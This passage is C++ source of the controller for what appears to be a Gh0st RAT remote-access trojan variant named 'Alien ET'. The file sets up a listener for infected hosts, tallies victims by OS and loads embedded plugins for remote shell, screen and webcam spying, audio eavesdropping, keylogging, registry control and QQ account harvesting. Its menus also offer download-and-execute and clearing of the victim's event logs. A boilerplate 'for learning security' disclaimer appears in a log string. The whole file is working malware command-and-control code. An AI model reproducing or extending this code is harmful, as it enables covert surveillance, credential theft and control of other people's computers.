// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Gh0st.h"
#include "Gh0stView.h"
#include "MainFrm.h"
#include "PcView.h"
#include "SettingDlg.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "ShellDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "LocalUpload.h"
#include "KeyBoardDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "TextChatDlg.h"
#include "ProxyMapDlg.h"
#include "LogView.h"
#include "Build.h"
#include "MyToolsKit.h"
#include "Mydat.h"
#include "UpdateDlg.h"
#include "InputDlg.h"
#include "TextChatDlg.h"
#include "SelectQQ.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include ".\Plugins\C_FILE.h"
#include ".\Plugins\\C_SHELL.h"
#include ".\Plugins\\C_SCREEN.h"
#include ".\Plugins\\C_VIDEO.h"
#include ".\Plugins\\C_LISTEN.h"
#include ".\Plugins\\C_SYSTEM.h"
#include ".\Plugins\\C_KEYLOG.h"
#include ".\Plugins\\C_SERVICE.h"
#include ".\Plugins\\C_REGEDIT.h"
#include ".\Plugins\\C_CHAT.h"
#include ".\Plugins\\C_PROXYMAP.h"
#include ".\Plugins\\C_GETQQ.h"

CMainFrame	*g_pFrame = NULL;
CIOCPServer * m_iocpServer = NULL;
extern CGh0stView* g_pTabView;
extern CLogView* g_pLogView;

PDllCode lpFilePacket = NULL;
PDllCode lpShellPacket = NULL;
PDllCode lpScreenPacket = NULL;
PDllCode lpWebCamPacket = NULL;
PDllCode lpAudioPacket = NULL;
PDllCode lpSystemPacket = NULL;
PDllCode lpKeyboardPacket = NULL;
PDllCode lpServicePacket = NULL;
PDllCode lpRegeditPacket = NULL;
PDllCode lpTextChatPacket = NULL;
PDllCode lpProxyMapPacket = NULL;

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
    //{{AFX_MSG_MAP(CMainFrame)
    ON_WM_CREATE()
    ON_WM_SYSCOMMAND()
    ON_COMMAND(ID_MENUITEM_SHOW, OnMenuitemShow)
    ON_COMMAND(ID_MENUITEM_HIDE, OnMenuitemHide)
    ON_WM_CLOSE()
    ON_COMMAND(ID_MENUITEM_SETTING, OnMenuitemSetting)
    ON_COMMAND(ID_MENUITEM_BUILD, OnMenuitemBuild)
    ON_COMMAND(IDM_TOOLS, OnTools)     //实用工具
    ON_WM_TIMER()
    ON_COMMAND(ID_MENUITEM_UPDATE_IP, OnMenuitemUpdateIp)
    //}}AFX_MSG_MAP
    ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)

    ON_XTP_CREATECONTROL()
    ON_COMMAND(IDM_POPUP1,OnPopup)
    ON_COMMAND(IDM_POPUP2,OnPopup)
    ON_COMMAND(IDM_POPUP3,OnPopup)
    ON_COMMAND(IDM_POPUP4,OnPopup)
    ON_COMMAND(IDM_POPUP5,OnPopup)

    ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
    ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
    ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
    ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
    ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
    ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
    ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
    ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
    ON_MESSAGE(WM_OPENBUILDDIALOG, OnOpenBuildDialog)
    ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
    ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
    ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)  //注册表
    ON_MESSAGE(WM_OPENTEXTCHATDIALOG, OnOpenTextChatDialog)
    ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog)
    ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)

    ON_MESSAGE(WM_OPENPQQBOXDIALOG, OnOpenQQBoxDialog)

    ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)

    ON_COMMAND(ID_QUIT_APP, &CMainFrame::OnExit)
END_MESSAGE_MAP()

static UINT indicators[] = {
    ID_STAUTS_OS,	// 主机统计
    ID_STAUTSSPEED,	// 上传速度
    ID_STAUTJSPEED, // 下载速度
    ID_STAUTS_PORT, //  端口
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
    // TODO: add member initialization code here
    g_pFrame = this;
    memset(nOSCount,0,sizeof(nOSCount));
}

CMainFrame::~CMainFrame()
{
	SAFE_DELETE(lpFilePacket);
	SAFE_DELETE(lpShellPacket);
	SAFE_DELETE(lpScreenPacket);
	SAFE_DELETE(lpWebCamPacket);
	SAFE_DELETE(lpAudioPacket);
	SAFE_DELETE(lpSystemPacket);
	SAFE_DELETE(lpKeyboardPacket);
	SAFE_DELETE(lpServicePacket);
	SAFE_DELETE(lpRegeditPacket);
	SAFE_DELETE(lpTextChatPacket);
	SAFE_DELETE(lpProxyMapPacket);
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
    if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
        return -1;

    //界面居中显示
    this ->CenterWindow(CWnd::GetDesktopWindow());

    if (!m_wndStatusBar.Create(this) ||
        !m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT))) {
        TRACE0("Failed to create status bar\n");
        return -1;      // fail to create
    }

    // 初始化 command bars
    if (!InitCommandBars())
        return -1;

    //////////////////////////////////////////////////////////////////////////////////////
    if (!m_wndDlgBar.Create(this, IDD_DIALOGBAR, WS_VISIBLE|WS_CHILD|CBRS_SIZE_DYNAMIC|CBRS_ALIGN_TOP, IDD_DIALOGBAR)) {
        TRACE0( "Failed to create dialogbar ");
        return -1;
    }

    // 添加状态栏
    if ((!m_wndStatusBar.GetSafeHwnd() && !m_wndStatusBar.Create(this)) ||
        !m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT))) {
        TRACE0("Failed to create status bar\n");
        return -1;      // fail to create
    }
    //设置下面状态栏
    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
    m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
    m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏

    LoadIcons();  //右键菜单显示图标

    // 创建托盘图标
    if (!m_TrayIcon.Create(_T("Alien ET: 0"), // 提示文本
                           this,                       // 父窗口
                           IDR_MAINFRAME,              // 托盘图标ID
                           IDR_MENU_TRAY,              // 右键菜单ID
                           ID_MENUITEM_SHOW,           // 默认单击事件
                           false)) {                   // True if default menu item is located by position
        TRACE0("Failed to create tray icon\n");
        return -1;
    }

    m_paneManager.InstallDockingPanes(this);
    m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005); // 设置主题

    CXTPDockingPane* pwndPaneLog = CreatePane(235, 150, RUNTIME_CLASS(CLogView), _T("日志信息"), xtpPaneDockBottom);
    pwndPaneLog->Select();
    pwndPaneLog->SetOptions(xtpPaneNoCaption);

    m_paneManager.ShowPane(pwndPaneLog, 1);
    // 初始化插件内存

    // File
    lpFilePacket = new DllCode(COMMAND_LIST_DRIVE, FILEMyFileBuf, sizeof(FILEMyFileBuf));

    // Shell
    lpShellPacket = new DllCode(COMMAND_SHELL, SHELLMyFileBuf, sizeof(SHELLMyFileBuf));

    // 屏幕
    lpScreenPacket = new DllCode(COMMAND_SCREEN_SPY, SCREENMyFileBuf, sizeof(SCREENMyFileBuf));

    // webcam
    lpWebCamPacket = new DllCode(COMMAND_WEBCAM, VIDEOMyFileBuf, sizeof(VIDEOMyFileBuf));

    // Audio
    lpAudioPacket = new DllCode(COMMAND_AUDIO, LISTENMyFileBuf, sizeof(LISTENMyFileBuf));

    // System
    lpSystemPacket = new DllCode(COMMAND_SYSTEM, SYSTEMMyFileBuf, sizeof(SYSTEMMyFileBuf));

    // Service
    lpServicePacket = new DllCode(COMMAND_SERVICE_MANAGER, SERVICEMyFileBuf, sizeof(SERVICEMyFileBuf));

    // Regedit
    lpRegeditPacket = new DllCode(COMMAND_REGEDIT, REGEDITMyFileBuf, sizeof(REGEDITMyFileBuf));

    // TextChat
    lpTextChatPacket = new DllCode(COMMAND_TEXT_CHAT, CHATMyFileBuf, sizeof(CHATMyFileBuf));

    // ProxyMap
    lpProxyMapPacket = new DllCode(COMMAND_PROXY_MAP, PROXYMAPMyFileBuf, sizeof(PROXYMAPMyFileBuf));

    CXTPPaintManager::SetTheme(xtpThemeVisualStudio2010);//状态栏的XTP

    return 0;
}


CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat,
    XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
    static int m_nCount = 0;
    int nID = ++m_nCount;

    CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);

    CString strTitle;
    strTitle.Format(strFormat, nID);
    pwndPane->SetTitle(strTitle);
    pwndPane->SetIconID(nID % 6 + 1);

    CXTPFrameWnd* pFrame = new CXTPFrameWnd;

    CCreateContext context;
    context.m_pNewViewClass = pNewViewClass;
    context.m_pCurrentDoc = GetActiveView()->GetDocument();

    pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
    pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);

    m_mapPanes.SetAt(nID, pFrame);

    return pwndPane;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
    if( !CXTPFrameWnd::PreCreateWindow(cs) )
        return FALSE;
    // TODO: Modify the Window class or styles here by modifying
    //  the CREATESTRUCT cs
    cs.lpszClass = _T("XTPMainFrame");
    CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass,
                                      CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));


    cs.cx =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Alien", "Width",  1200);
    cs.cy =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Alien", "Hight",  700);

    cs.dwExStyle&=~WS_EX_CLIENTEDGE;
    cs.style &= ~FWS_ADDTOTITLE;
    // 主窗口标题
    cs.lpszName = _T("Alien ET 1.0");

    return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
    CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers
void CMainFrame::OnPopup()
{}

// 激活监听服务
void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{

    SetTimer(0x000,1000,NULL);
    HICON icon0 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_zj),IMAGE_ICON, 16, 16, LR_SHARED);

    HICON icon1 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_fs),IMAGE_ICON, 16, 16, LR_SHARED);

    HICON icon2 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_js),IMAGE_ICON, 16, 16, LR_SHARED);

    HICON icon3 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_dk),IMAGE_ICON, 16, 16, LR_SHARED);

    //	CMainFrame* pFrm=(CMainFrame*)AfxGetApp()->m_pMainWnd;//得到主框架类指针
    CStatusBar* pStatus=&g_pFrame->m_wndStatusBar;//指针状态栏指针,m_wndStatusBar被我改成public属性了.
    if(pStatus) {
        //加载图标的资源
        pStatus->GetStatusBarCtrl().SetIcon(0,icon0);
        pStatus->GetStatusBarCtrl().SetIcon(1,icon1);
        pStatus->GetStatusBarCtrl().SetIcon(2,icon2);
        pStatus->GetStatusBarCtrl().SetIcon(3,icon3);

    }
    //判断这个m_iocpServer全局变量是否已经指向了一个CIOCPServer
    if (m_iocpServer != NULL) {
        //，如果是的话，就要先关闭它，并且删除掉这个CIOCPServer所占的内存空间
        m_iocpServer->Shutdown();
        delete m_iocpServer;
    }
    m_iocpServer = new CIOCPServer;

    // 开始心跳
    m_iocpServer->m_nHeartBeatTime = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);

    CString str,IP;

    // 开启IPCP服务器
    if (m_iocpServer->Initialize(NotifyProc, nMaxConnections, nPort)) {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        HOSTENT *host = gethostbyname(hostname);
        if (host != NULL) {
            for ( int i=0; ; i++ ) {
                IP += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
                if ( host->h_addr_list[i] + host->h_length >= host->h_name )
                    break;
                IP += "/";
            }
        } else
            IP = _T("127.0.0.1");

        str.Format("端口:%d",nPort);
        m_wndStatusBar.SetPaneText(3, str);
        CString strLogText,strlogData;
        strLogText.Format( "系统成功启动 -> 监听端口: [ %d ]", nPort );
        g_pLogView->InsertLogItem( strLogText, 0, 1 );
        strlogData.Format( "申明：本软件用于学习网络安全，请不要触犯法律，否则后果自行负责，一切与原作者无关。");
        g_pLogView->InsertLogItem( strlogData, 0, 0 );

    } else {
        IP.Format(_T("端口 %d 监听失败"), nPort);
        m_wndStatusBar.SetPaneText(3, "端口:0");
        g_pLogView->InsertLogItem( IP, 0, 2 );
    }
}

void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode)
{
    switch (nCode) {
    case NC_CLIENT_CONNECT:
        break;
    case NC_CLIENT_DISCONNECT:
        g_pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
        break;
    case NC_TRANSMIT:
        break;
    case NC_RECEIVE:
        ProcessReceive(pContext);
        break;
    case NC_RECEIVE_COMPLETE:
        ProcessReceiveComplete(pContext);
        break;
    default:
        break;
    }
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
    if (pContext == NULL)
        return;

    // 如果管理对话框打开，交给相应的对话框处理
    CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

    // 交给窗口处理
    if (pContext->m_Dialog[0] > 0) {
        switch (pContext->m_Dialog[0]) {
        case FILEMANAGER_DLG:
            ((CFileManagerDlg *)dlg)->OnReceiveComplete();
            break;
        case SCREENSPY_DLG:
            ((CScreenSpyDlg *)dlg)->OnReceiveComplete();
            break;
        case SHELL_DLG:
            ((CShellDlg *)dlg)->OnReceiveComplete();
            break;
        case WEBCAM_DLG:
            ((CWebCamDlg *)dlg)->OnReceiveComplete();
            break;
        case AUDIO_DLG:
            ((CAudioDlg *)dlg)->OnReceiveComplete();
            break;
        case SYSTEM_DLG:
            ((CSystemDlg *)dlg)->OnReceiveComplete();
            break;
        case KEYBOARD_DLG:
            ((CKeyBoardDlg *)dlg)->OnReceiveComplete();
            break;
        case SERVICE_DLG:
            ((CServiceDlg *)dlg)->OnReceiveComplete();
            break;
        case REGEDIT_DLG:
            ((CRegeditDlg *)dlg)->OnReceiveComplete();
            break;
        case CHAT_DLG:
            ((CTextChatDlg *)dlg)->OnReceiveComplete();
            break;
        case PROXYMAP_DLG:
            ((CProxyMapDlg *)dlg)->OnReceiveComplete();
            break;
        case GETDAT_DLG:
            ((CMydat *)dlg)->OnReceiveComplete();//附加功能
            break;
        default:
            break;
        }
        return;
    }

    switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
    case TOKEN_LOGIN: { // 上线包
        pContext->m_bIsMainSocket = TRUE;
        g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
    }
    break;
    case TOKEN_DRIVE_LIST: // 文件管理 驱动器列表
        // 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
        g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_BITMAPINFO: // 屏幕查看
        g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
        g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_AUDIO_START: // 语音
        g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_SHELL_START: //开始CMD
        g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_PSLIST:     // 系统管理 进程列表
        g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_FIND_YES: // 筛选存在
        g_pFrame->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
        break;
    case TOKEN_DLLINFO:
        g_pFrame->PostMessage(WM_OPENBUILDDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_KEYBOARD_START:
        g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_SERVICE_LIST:
        g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_REGEDIT:   //注册表管理
        g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_TEXTCHAT_START:
        g_pFrame->PostMessage(WM_OPENTEXTCHATDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_PROXY_START:
        g_pFrame->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_CHAT_START:
        g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_GETQQNUM:
        g_pFrame->PostMessage(WM_WRITEQQNUM, 0, (LPARAM)pContext);
        break;
    case TOKEN_SHOWQQ: {
        g_pFrame->PostMessage(WM_OPENPQQBOXDIALOG, 0, (LPARAM)pContext);
    }
    break;
    case TOKEN_RECV_QQ: {
        CString str = "QQ返回: ";
        str += (char *)pContext->m_DeCompressionBuffer.GetBuffer(1);
        g_pLogView->InsertLogItem(str, 0, 0 );
    }
    break;
    default:
        closesocket(pContext->m_Socket);
        break;
    }
}


// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
    if (pContext == NULL)
        return;
    // 如果管理对话框打开，交给相应的对话框处理
    CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

    // 交给窗口处理
    if (pContext->m_Dialog[0] > 0) {
        switch (pContext->m_Dialog[0]) {
        case SCREENSPY_DLG:
            ((CScreenSpyDlg *)dlg)->OnReceive();
            break;
        case WEBCAM_DLG:
            ((CWebCamDlg *)dlg)->OnReceive();
            break;
        default:
            break;
        }
        return;
    }
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
    m_TrayIcon.ShowBalloonTip( lpszText, _T("新上线主机信息: "), NIIF_INFO, 10);
}

void CMainFrame::LoadIcons()   //右键菜单显示图标
{
    CXTPCommandBars* pCommandBars = GetCommandBars();

    UINT uiGroupFind[] = {ID_MENUITEM_FILEMANAGER,ID_MENUITEM_SCREENSPY,ID_MENUITEM_KEYBOARD,ID_MENUITEM_REMOTESHELL,
        ID_MENUITEM_SYSTEM,ID_MENUITEM_WEBCAM,ID_MENUITEM_AUDIO_LISTEN,ID_MENUITEM_REGEDIT,
                          ID_MENUITEM_SERVICEMANAGER,	ID_MENUITEM_TEXT_CHAT,IDM_CHAT
                         };
    UINT uiGroupFind2[] = {ID_MENUITEM_LOGOFF,ID_MENUITEM_REBOOT,ID_MENUITEM_SHUTDOWN,ID_MENUITEM_UNINSTALL,
        ID_MENUITEM_PROXY,ID_MENUITEM_PROXY_MAP,ID_MENUITEM_PRANK,ID_MENUITEM_MESSAGEBOX,ID_MENUITEM_SELECT_ALL,ID_MENUITEM_UNSELECT_ALL
                          };
    UINT uiGroupFind3[] = {ID_MENUITEM_FIND_PROCESS,ID_MENUITEM_FIND_WINDOW,ID_MENUITEM_CLEAN_FIND,
        ID_MENUITEM_OPEN_URL_HIDE,ID_MENUITEM_OPEN_URL_SHOW,ID_MENUITEM_REMARK,IDM_POPUP1,IDM_POPUP2,IDM_POPUP3,IDM_POPUP4
                           ,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST,IDM_SETCOLOR
                          };
    UINT uiGroupFind4[] = {ID_MENUITEM_CHANGE_GROUP,ID_MENUITEM_COPY_IP,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST};
    UINT uiGroupFind5[] = {ID_MENUITEM_LOCAL_UPLOAD,ID_MENUITEM_DOWNEXEC,ID_MENUITEM_UPDATE_SERVER,ID_MENUITEM_CLEANEVENT_ALL,
        ID_MENUITEM_CLEANEVENT_SYS,ID_MENUITEM_CLEANEVENT_SECURITY,ID_MENUITEM_CLEANEVENT_APP
                          };
    UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY};  //日志管理
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU, uiGroupFind, _countof(uiGroupFind), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU2, uiGroupFind2, _countof(uiGroupFind2), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU3, uiGroupFind3, _countof(uiGroupFind3), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU4, uiGroupFind4, _countof(uiGroupFind4), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU5, uiGroupFind5, _countof(uiGroupFind5), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU6, uiGroupFind6, _countof(uiGroupFind6), CSize(16, 16));
}

void CMainFrame::ShowConnectionsNumber()
{
    CString str,strTemp;

    int a = 0;
    CPcView* pView = NULL;
    int count = g_pTabView->m_wndTabControl.GetItemCount();
    for (int i = 0; i < count; i++) {
        pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
        a += pView->m_pListCtrl->GetItemCount();
    }

    strTemp.Format(_T("->(合计: %d台)"), a);

    str.Format(_T("NT:%d Win2000:%d Xp:%d Win2003:%d Vista:%d Win2008:%d Win7:%d Win8:%d Win2012:%d Win10:%d %s"),
               nOSCount[0],
               nOSCount[1],
               nOSCount[2],
               nOSCount[3],
               nOSCount[4],
               nOSCount[5],
               nOSCount[6],
               nOSCount[7],
               nOSCount[8],
               nOSCount[9],
               strTemp);
    m_wndStatusBar.SetPaneText(0, str);

    UpdateData();

    g_pFrame->m_TrayIcon.SetTooltipText(strTemp);
}

void CMainFrame::OnCustomize()
{
    // get a pointer to the command bars object.
    CXTPCommandBars* pCommandBars = GetCommandBars();
    if (pCommandBars == NULL)
        return;

    // instanciate the customize dialog
    CXTPCustomizeSheet dlg(pCommandBars);

    // add the options page to the customize dialog.
    CXTPCustomizeOptionsPage pageOptions(&dlg);
    dlg.AddPage(&pageOptions);

    // add the commands page to the customize dialog.
    CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
    pPageCommands->AddCategories(IDR_MAINFRAME);

    // initialize the commands page page.
    pPageCommands->InsertAllCommandsCategory();
    pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
    pPageCommands->InsertNewMenuCategory();

    // display the customize dialog.
    dlg.DoModal();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
    if (nID == SC_MINIMIZE) {
        m_TrayIcon.MinimizeToTray(this);
    } else {
        CXTPFrameWnd::OnSysCommand(nID, lParam);
    }
}

void CMainFrame::OnMenuitemShow()
{
    // TODO: Add your command handler code here
    if (!IsWindowVisible()) {
        m_TrayIcon.MaximizeFromTray(this);
    } else
        m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnMenuitemHide()
{
    // TODO: Add your command handler code here
    m_TrayIcon.MinimizeToTray(this);
}

// 最小化到托盘
void CMainFrame::OnClose()
{
    // TODO: Add your message handler code here and/or call default
    m_TrayIcon.MinimizeToTray(this);
}

// 退出程序
void CMainFrame::OnExit()
{
    if (MessageBox(_T("确定退出?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
        return;

    KillTimer(0);  //关闭定时器

    RECT rect;
    ::GetWindowRect(GetSafeHwnd(), &rect);
    ((CGh0stApp*)AfxGetApp())->m_IniFile.SetInt("Alien", "Width", rect.right - rect.left);
    ((CGh0stApp*)AfxGetApp())->m_IniFile.SetInt("Alien", "Hight", rect.bottom - rect.top);

    CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
    SaveCommandBars(_T("CommandBars"));
    pMainFrame->m_TrayIcon.RemoveIcon();

    if (NULL != m_iocpServer) {
        m_iocpServer->Shutdown();
        delete m_iocpServer;
    }

    CXTPFrameWnd::OnClose();
}


int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
    if (lpCreateControl->bToolBar == FALSE) {
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("增强功能(&I)")) {
            if (lpCreateControl->nID != IDM_POPUP1) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP1;
            }
            return TRUE;
        }
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("会话管理(&S)")) {
            if (lpCreateControl->nID != IDM_POPUP2) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP2;
            }
            return TRUE;
        }
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("其他功能(&O)")) {
            if (lpCreateControl->nID != IDM_POPUP3) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP3;
            }
            return TRUE;
        }
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("清理日志(&C)")) {
            if (lpCreateControl->nID != IDM_POPUP4) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP4;
            }
            return TRUE;
        }
    }

    return FALSE;
}


void CMainFrame::OnTools()
{
    CMyToolsKit dlg;
    dlg.DoModal();
}

void CMainFrame::OnMenuitemSetting()
{
    CSettingDlg dlg;
    dlg.DoModal();
}

void CMainFrame::OnMenuitemBuild()
{
    CBuild dlg;
    dlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return -1;

    if (!pContext->m_bIsMainSocket) {
        // 关闭相关窗口
        switch (pContext->m_Dialog[0]) {
        case FILEMANAGER_DLG:
        case SCREENSPY_DLG:
        case SHELL_DLG:
        case WEBCAM_DLG:
        case AUDIO_DLG:
        case SYSTEM_DLG:
        case KEYBOARD_DLG:
        case SERVICE_DLG:
        case REGEDIT_DLG:
        case CHAT_DLG:
        case PROXYMAP_DLG:
            ((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
            break;
        default:
            break;
        }
        return 1;
    }

    CPcView* pView = NULL;
    CString strOSCount;
    int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
    bool bIsOk = false;
    for (int n = 0; n < nTabs; n++ ) {
        pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
        // 删除链表过程中可能会删除Context
        try {
            if (pContext->m_bIsMainSocket) {
                int nCnt = pView->m_pListCtrl->GetItemCount();
                for (int i=0; i < nCnt; i++) {
                    if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i)) {
                        CString strLogText,strTemp,strGroupName;

                        strTemp = g_pTabView->m_wndTabControl.GetItem(n)->GetCaption();
                        int n = strTemp.ReverseFind('(');
                        if ( n > 0 ) {
                            strGroupName = strTemp.Left(n);
                        } else {
                            strGroupName = strTemp;
                        }

                        strLogText.Format(("主机下线:[%s/%s] -> 分组:[%s] -> 区域:[%s]"),
                                          pView->m_pListCtrl->GetItemText(i, 2),  //外网IP
                                          pView->m_pListCtrl->GetItemText(i, 3),  //内网IP
                                          strGroupName,  //上线分组
                                          pView->m_pListCtrl->GetItemText(i, 0));  //地理位置
                        g_pLogView->InsertLogItem( strLogText, 0, 2 );


